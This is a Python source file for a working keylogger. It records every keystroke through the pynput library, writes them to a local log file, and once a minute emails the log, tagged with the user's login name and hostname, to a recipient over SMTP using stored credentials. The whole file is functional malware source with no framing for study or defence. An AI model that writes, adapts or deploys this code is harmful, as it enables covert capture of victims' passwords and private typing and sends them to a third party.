import os
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import json
import socket

# Load credentials from the JSON file
with open("credentials.json", "r") as f:
    credentials = json.load(f)

# Get email credentials
email_config = credentials["email"]
SMTP_SERVER = email_config["smtp_server"]
SMTP_PORT = email_config["smtp_port"]
EMAIL_ACCOUNT = email_config["email_account"]
EMAIL_PASSWORD = email_config["email_password"]
RECIPIENT = email_config["recipient"]

# Get username and hostname
username = os.getlogin()
hostname = socket.gethostname()

# File to store keystrokes
LOG_FILE = "keylog.txt"

# Variable to store keystrokes
keystrokes = []

# Function to send email
def send_email(subject, body):
    try:
        # Create the email
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ACCOUNT
        msg['To'] = RECIPIENT
        msg['Subject'] = f"{subject} {username} {hostname}"  # Include username and hostname
        msg.attach(MIMEText(body, 'plain'))

        # Connect to the SMTP server
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_ACCOUNT, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ACCOUNT, RECIPIENT, msg.as_string())
        server.quit()
        print("Email sent successfully.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to handle key presses
def on_press(key):
    try:
        keystrokes.append(str(key.char))
    except AttributeError:
        keystrokes.append(str(key))
    # Write keystrokes to file
    with open(LOG_FILE, "a") as file:
        file.write("".join(keystrokes))
    keystrokes.clear()

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(60)  # Wait for 1 minute
            # Read the log file and send its contents via email
            with open(LOG_FILE, "r") as file:
                data = file.read()
                if data:
                    send_email("Keystroke Log File", f"Keylog Data:\n{data}")
                    # Clear the log file after sending
                    open(LOG_FILE, "w").close()

# Run the keylogger
if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, "w").close()
    start_keylogger()